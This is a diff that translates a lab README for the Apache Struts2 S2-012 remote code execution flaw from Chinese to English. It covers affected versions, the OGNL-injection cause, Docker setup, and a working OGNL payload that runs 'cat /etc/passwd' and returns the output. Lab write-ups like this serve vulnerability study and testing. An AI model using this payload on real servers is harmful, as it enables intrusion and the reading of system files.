@@ -1,19 +1,14 @@
-# S2-012 远程代码执行漏洞
+# S2-012 Remote Code Execution Vulnerablity
 
-影响版本: 2.1.0 - 2.3.13
+[中文版本(Chinese version)](README.zh-cn.md)
 
-漏洞详情: http://struts.apache.org/docs/s2-012.html
+Affected Version: 2.1.0 - 2.3.13
 
-## 测试环境搭建
+Details: http://struts.apache.org/docs/s2-012.html
 
-```
-docker-compose build
-docker-compose up -d
-```
+## Reference
 
-## 原理
-
-如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：
+If the redirect type is used when configuring `result` in the `action`, and ${param_name} is also used as the redirect variable, for example:
 
 ```xml
 <package name="S2-012" extends="struts-default">
@@ -25,16 +20,23 @@ docker-compose up -d
 </package>
 ```
 
-这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。
+During the redirection process, struts2 performs an OGNL expression parsing on the value of the `name` parameter, so that OGNL expression can be inserted to cause the command execution.
 
-## Exp
+## Setup
 
-可以直接祭出s2-001中的回显POC，因为这里是没有沙盒，也没有限制任何特殊字符（为什么？）。
+```
+docker-compose build
+docker-compose up -d
+```
+
+## Exploit
+
+We can use s2-001's POC directly:
 
 ```
 %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 ```
 
-发送请求，执行命令：
+Result：
 
 ![](1.png)
